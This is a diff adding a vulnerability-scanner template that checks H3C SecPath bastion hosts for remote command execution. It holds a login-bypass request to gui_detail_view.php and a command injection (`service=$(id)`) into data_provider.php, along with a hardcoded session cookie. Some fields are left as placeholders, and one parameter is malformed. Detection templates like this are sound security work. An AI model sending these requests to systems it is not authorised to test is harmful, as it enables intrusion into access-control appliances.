@@ -1,0 +1,24 @@
+id: h3c-SecParh-login-rce
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: H3C SecParh堡垒机 data_provider.php 存在远程命令执行漏洞，攻击者通过任意用户登录或者账号密码进入后台就可以构造特殊的请求执行命令。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/H16-1H3C-SecPath%E5%A0%A1%E5%9E%92%E6%9C%BA-RCE?id=h16-1h3c-secpath%e5%a0%a1%e5%9e%92%e6%9c%ba-rce
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin"
+      - "{{BaseURL}}/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true"
+    headers:
+      Cookie: PHPSESSID=grlcbpjqpu59r6aanqjsn2gao0
+      
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'
